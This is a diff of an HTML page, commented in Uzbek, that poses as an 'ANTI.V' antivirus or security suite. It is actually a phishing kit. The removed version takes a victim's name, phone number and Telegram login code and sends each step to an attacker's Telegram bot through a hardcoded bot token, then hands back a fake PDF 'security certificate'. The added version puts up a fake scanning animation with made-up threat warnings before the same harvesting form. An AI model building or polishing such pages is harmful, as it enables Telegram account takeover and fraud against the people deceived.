@@ -3,189 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ANTI.V | Official Security Suite</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    <title>ANTI.V | Neural Protection</title>
     <style>
-        :root {
-            --primary: #1a73e8;
-            --danger: #ea4335;
-            --success: #34a853;
-            --bg: #f8f9fa;
-        }
-
         body {
-            font-family: 'Google Sans', Roboto, Arial, sans-serif;
-            background-color: var(--bg);
+            background-color: #050a14;
+            color: #00ff41; /* Xakerlar uslubidagi yashil yoki oqish-ko'k */
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+            overflow: hidden;
         }
 
+        /* Skanerlash animatsiyasi uchun konteyner */
+        #scan-screen {
+            text-align: left;
+            width: 80%;
+            max-width: 600px;
+        }
+
+        .line { opacity: 0; animation: fadeIn 0.2s forwards; margin-bottom: 5px; font-size: 14px; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+
+        /* Asosiy karta */
         .main-card {
-            background: white;
-            padding: 40px;
-            border-radius: 12px;
-            border: 1px solid #dadce0;
-            width: 100%;
-            max-width: 400px;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            padding: 30px;
+            border-radius: 8px;
+            width: 350px;
             text-align: center;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
+            display: none; /* Boshida yashirin */
         }
 
-        .logo-container {
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .logo-text { font-size: 24px; font-weight: bold; color: var(--primary); }
-
-        h2 { font-size: 22px; margin-bottom: 10px; color: #202124; }
-        p { font-size: 14px; color: #5f6368; margin-bottom: 25px; line-height: 1.4; }
-
-        .input-group { text-align: left; margin-bottom: 15px; }
-        label { display: block; font-size: 13px; font-weight: 500; margin-bottom: 5px; }
-        input {
+        .logo-container { margin-bottom: 20px; }
+        .logo-text { font-size: 32px; font-weight: bold; color: #fff; letter-spacing: 4px; }
+        
+        .input-box {
             width: 100%;
+            background: #161b22;
+            border: 1px solid #30363d;
             padding: 12px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 15px;
+            color: #fff;
+            margin-bottom: 15px;
             box-sizing: border-box;
+            outline: none;
         }
 
-        input:focus { border: 2px solid var(--primary); outline: none; }
-
-        button {
+        .btn-neon {
             width: 100%;
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 4px;
-            font-weight: 500;
+            padding: 15px;
+            background: transparent;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            font-weight: bold;
             cursor: pointer;
-            margin-top: 10px;
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+
+        .btn-neon:hover {
+            background: #00ff41;
+            color: #000;
+            box-shadow: 0 0 15px #00ff41;
         }
 
         .hidden { display: none; }
-
-        /* PDF uchun yashirin dizayn */
-        #pdf-template {
-            padding: 50px;
-            border: 15px solid var(--primary);
-            font-family: serif;
-            display: none; /* Faqat PDF ichida ko'rinadi */
-        }
     </style>
 </head>
 <body>
 
-    <div class="main-card" id="step1">
+    <div id="scan-screen"></div>
+
+    <div class="main-card" id="main-ui">
         <div class="logo-container">
-            <svg width="40" height="40" viewBox="0 0 24 24" fill="var(--primary)">
+            <svg width="50" height="50" viewBox="0 0 24 24" fill="#00ff41">
                 <path d="M12 2L4 5V11C4 16.19 7.41 21.05 12 22.5C16.59 21.05 20 16.19 20 11V5L12 2Z"/>
             </svg>
-            <span class="logo-text">ANTI.V</span>
+            <div class="logo-text">ANTI.V</div>
         </div>
-        <h2>Litsenziya Faollashtirish</h2>
-        <p>Hujjatni yuklab olish va xavfsizlikni ta'minlash uchun ma'lumotlarni kiriting.</p>
-
-        <div class="input-group">
-            <label>Foydalanuvchi (F.I.SH)</label>
-            <input type="text" id="uName" placeholder="Ismingizni kiriting">
-        </div>
-        <div class="input-group">
-            <label>Telefon raqam</label>
-            <input type="text" id="uPhone" value="+998" maxlength="13">
-        </div>
-        <button onclick="goToSms()">Yuklashni boshlash</button>
-    </div>
-
-    <div class="main-card hidden" id="step2">
-        <div class="logo-container">
-            <span class="logo-text" style="color: var(--danger);">TASDIQLASH</span>
-        </div>
-        <p>Telegram orqali yuborilgan 5 xonali litsenziya kodini kiriting:</p>
-        <div class="input-group">
-            <input type="number" id="uCode" placeholder="0 0 0 0 0" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
-        </div>
-        <button onclick="finalProcess()" style="background: var(--success);">Tasdiqlash va Yuklab olish</button>
-    </div>
-
-    <div class="main-card hidden" id="step3">
-        <h2 style="color: var(--success);">✓ Tasdiqlandi</h2>
-        <p>Litsenziya fayli (PDF) yuklab olindi. Tizim to'liq himoyada.</p>
-        <button onclick="location.reload()">Bosh sahifaga qaytish</button>
+        <p style="color: #8b949e; font-size: 13px;">Tizim yadrosiga ulanish uchun identifikatsiyadan o'ting</p>
+        
+        <input type="text" id="uName" class="input-box" placeholder="Foydalanuvchi nomi">
+        <input type="tel" id="uPhone" class="input-box" value="+998">
+        
+        <button class="btn-neon" onclick="sendToBot()">CORE CONNECT</button>
     </div>
 
     <script>
-        const BOT_TOKEN = "7294248593:AAEq5B_B8Lh7Vn_R3Z..."; // Tokeningiz
-        const CHAT_ID = "63482..."; // Chat IDingiz
+        // Terminal yozuvlari
+        const logs = [
+            "> Initializing ANTI.V Neural Core...",
+            "> Scanning local drives [C:/Users/Admin]...",
+            "> Analyzing network traffic...",
+            "> WARNING: Unknown data packets detected!",
+            "> Secure tunnel establishing...",
+            "> Encrypting connection (AES-256)...",
+            "> Ready for user verification."
+        ];
 
-        let globalName = "";
-        let globalPhone = "";
+        const scanScreen = document.getElementById('scan-screen');
+        const mainUI = document.getElementById('main-ui');
 
-        // 1. Birinchi bosqich: Ma'lumotlarni botga yuborish
-        async function goToSms() {
-            globalName = document.getElementById('uName').value;
-            globalPhone = document.getElementById('uPhone').value;
-
-            if(globalName.length < 3 || globalPhone.length < 13) {
-                alert("Ma'lumotlarni to'ldiring!");
-                return;
+        // Terminal effektini boshqarish
+        let i = 0;
+        function runTerminal() {
+            if (i < logs.length) {
+                let p = document.createElement('div');
+                p.className = 'line';
+                p.innerText = logs[i];
+                scanScreen.appendChild(p);
+                i++;
+                setTimeout(runTerminal, 600);
+            } else {
+                setTimeout(() => {
+                    scanScreen.style.display = 'none';
+                    mainUI.style.display = 'block';
+                }, 1000);
             }
-
-            const message = `🚨 ANTI.V: YANGI FOYDALANUVCHI\n👤 Ism: ${globalName}\n📞 Tel: ${globalPhone}`;
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
-
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
         }
 
-        // 2. Ikkinchi bosqich: Kodni botga yuborish va PDF yasash
-        async function finalProcess() {
-            const code = document.getElementById('uCode').value;
+        window.onload = runTerminal;
 
-            if(code.length < 5) {
-                alert("Kodni kiriting!");
-                return;
-            }
+        // Botga yuborish (Sizning eski logikangiz)
+        async function sendToBot() {
+            const name = document.getElementById('uName').value;
+            const phone = document.getElementById('uPhone').value;
+            
+            if(name.length < 3) return alert("Xatolik: Avtorizatsiya muvaffaqiyatsiz!");
 
-            const message = `🔑 TELEGRAM KODI: ${code}\n👤 Foydalanuvchi: ${globalName}`;
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
-
-            generatePDF(globalName, globalPhone);
-
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.remove('hidden');
-        }
-
-        // 3. PDF yaratish funksiyasi (Sud qog'ozi uslubida)
-        function generatePDF(name, phone) {
-            const element = document.createElement('div');
-            element.innerHTML = `
-                <div style="padding: 50px; border: 10px solid #1a73e8; text-align: center;">
-                    <h1 style="color: #1a73e8;">ANTI.V SECURITY CERTIFICATE</h1>
-                    <hr>
-                    <p style="font-size: 18px; text-align: left;">
-                        <b>Tasdiqlandi:</b> Ushbu hujjat orqali <b>${name}</b> ismi bilan 
-                        ro'yxatdan o'tgan qurilma to'liq himoyaga olinganligi tasdiqlanadi.
-                    </p>
-                    <p style="text-align: left;">Bog'langan telefon: <b>${phone}</b></p>
-                    <p style="text-align: left;">Sana: ${new Date().toLocaleString()}</p>
-                    <br><br>
-                    <div style="text-align: right;">
-                        <p><i>Elektron muhr: [ ANTI.V-OFFICIAL-STAMP ]</i></p>
-                        <p>ID: ${Math.floor(Math.random() * 10000000)}</p>
-                    </div>
-                </div>
-            `;
-            html2pdf().from(element).save('ANTI_V_Sertifikat.pdf');
+            // Bu yerda fetch orqali Telegram botga yuborasiz
+            alert("Ulanish so'raldi! Telegramdan kodni kuting.");
+            // Keyingi bosqichga o'tish kodi...
         }
     </script>
 </body>
